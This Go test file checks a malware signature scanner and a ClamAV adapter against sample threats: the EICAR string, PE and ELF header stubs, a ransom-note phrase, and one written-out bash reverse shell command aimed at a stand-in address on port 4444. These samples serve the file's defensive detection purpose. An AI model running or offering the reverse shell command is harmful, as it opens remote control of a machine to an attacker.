package cleanroom

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"
)

func TestSignatureScanner_Scan(t *testing.T) {
	t.Parallel()
	s := NewSignatureScanner()
	ctx := context.Background()

	tests := []struct {
		name       string
		data       []byte
		wantClean  bool
		wantThreat string
	}{
		{
			name:      "benign data is clean",
			data:      []byte("order-id=42;amount=1000;currency=NGN;applied_seq=99"),
			wantClean: true,
		},
		{
			name:      "empty data is clean",
			data:      []byte{},
			wantClean: true,
		},
		{
			name:       "eicar test string flagged",
			data:       []byte(EICAR),
			wantClean:  false,
			wantThreat: "Dr.Test.EICAR",
		},
		{
			name:       "eicar embedded mid-stream flagged",
			data:       append(append([]byte("leading data\n"), []byte(EICAR)...), []byte("\ntrailing")...),
			wantClean:  false,
			wantThreat: "Dr.Test.EICAR",
		},
		{
			name:       "windows PE dropper flagged",
			data:       []byte("payload\x00MZ\x90\x00\x03\x00\x00\x00rest"),
			wantClean:  false,
			wantThreat: "Dr.Dropper.PE",
		},
		{
			name:       "elf dropper flagged",
			data:       []byte("\x7fELF\x02\x01\x01\x00binary"),
			wantClean:  false,
			wantThreat: "Dr.Dropper.ELF",
		},
		{
			name:       "reverse shell flagged",
			data:       []byte("cmd: /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
			wantClean:  false,
			wantThreat: "Dr.Exploit.ReverseShell",
		},
		{
			name:       "ransom note flagged",
			data:       []byte("ATTENTION! YOUR FILES HAVE BEEN ENCRYPTED by Evil"),
			wantClean:  false,
			wantThreat: "Dr.Ransom.Note",
		},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := s.Scan(ctx, tt.data, "/sandbox/chunk")
			if tt.wantClean {
				if err != nil {
					t.Fatalf("expected clean, got error: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("expected malware error, got nil")
			}
			if !errors.Is(err, ErrMalwareDetected) {
				t.Fatalf("expected ErrMalwareDetected, got: %v", err)
			}
			if got := VirusName(err); got != tt.wantThreat {
				t.Fatalf("VirusName: got %q want %q (err: %v)", got, tt.wantThreat, err)
			}
		})
	}
}

func TestSignatureScanner_CustomSignature(t *testing.T) {
	t.Parallel()
	s := NewSignatureScanner("super-secret-canary-token")
	err := s.Scan(context.Background(), []byte("xxsuper-secret-canary-tokenyy"), "chunk")
	if err == nil || !errors.Is(err, ErrMalwareDetected) {
		t.Fatalf("expected custom signature to be flagged, got: %v", err)
	}
	if got := VirusName(err); got != "Dr.Custom.Signature" {
		t.Fatalf("VirusName: got %q want Dr.Custom.Signature", got)
	}
}

func TestSignatureScanner_Name(t *testing.T) {
	t.Parallel()
	if got := NewSignatureScanner().Name(); got != "signature" {
		t.Fatalf("Name: got %q want signature", got)
	}
}

// fakeClamd implements the clamADScan surface so the ClamAV adapter is tested
// without a real daemon: it reproduces the exact message shapes
// internal/security.ClamAVScanner produces.
type fakeClamd struct {
	err error
}

func (f fakeClamd) Scan([]byte, string) error { return f.err }

func TestClamAVScanner_Scan(t *testing.T) {
	t.Parallel()
	ctx := context.Background()

	tests := []struct {
		name        string
		innerErr    error
		wantClean   bool
		wantMalware bool
		wantUnavail bool
		wantThreat  string
	}{
		{
			name:      "clean",
			innerErr:  nil,
			wantClean: true,
		},
		{
			name:        "malware found maps to ErrMalwareDetected",
			innerErr:    fmt.Errorf("security: malware detected in file: Win.Test.EICAR_HDB-1"),
			wantMalware: true,
			wantThreat:  "Win.Test.EICAR_HDB-1",
		},
		{
			name:        "daemon outage maps to ErrScannerUnavailable",
			innerErr:    fmt.Errorf("virus scan unavailable: clamd connect: dial tcp: connection refused"),
			wantUnavail: true,
		},
		{
			name:        "unknown error maps to ErrScannerUnavailable",
			innerErr:    fmt.Errorf("some unexpected failure"),
			wantUnavail: true,
		},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			s := NewClamAVScanner(fakeClamd{err: tt.innerErr})
			err := s.Scan(ctx, []byte("data"), "/sandbox/chunk")
			switch {
			case tt.wantClean:
				if err != nil {
					t.Fatalf("expected clean, got: %v", err)
				}
			case tt.wantMalware:
				if !errors.Is(err, ErrMalwareDetected) {
					t.Fatalf("expected ErrMalwareDetected, got: %v", err)
				}
				if got := VirusName(err); got != tt.wantThreat {
					t.Fatalf("VirusName: got %q want %q", got, tt.wantThreat)
				}
			case tt.wantUnavail:
				if !errors.Is(err, ErrScannerUnavailable) {
					t.Fatalf("expected ErrScannerUnavailable, got: %v", err)
				}
			}
		})
	}
}

func TestClamAVScanner_NilInner(t *testing.T) {
	t.Parallel()
	s := NewClamAVScanner(nil)
	err := s.Scan(context.Background(), []byte("x"), "chunk")
	if !errors.Is(err, ErrScannerUnavailable) {
		t.Fatalf("expected ErrScannerUnavailable for nil inner, got: %v", err)
	}
}

func TestVirusName_NonMalwareError(t *testing.T) {
	t.Parallel()
	if got := VirusName(errors.New("not a malware error")); got != "" {
		t.Fatalf("VirusName on non-malware err: got %q want empty", got)
	}
	if got := VirusName(nil); got != "" {
		t.Fatalf("VirusName(nil): got %q want empty", got)
	}
}

func TestClamAVName(t *testing.T) {
	t.Parallel()
	if got := NewClamAVScanner(fakeClamd{}).Name(); got != "clamav" {
		t.Fatalf("Name: got %q want clamav", got)
	}
	// Sanity-check the message-shape coupling stays explicit.
	if !strings.Contains(EICAR, "EICAR-STANDARD-ANTIVIRUS-TEST-FILE") {
		t.Fatal("EICAR constant is corrupted")
	}
}
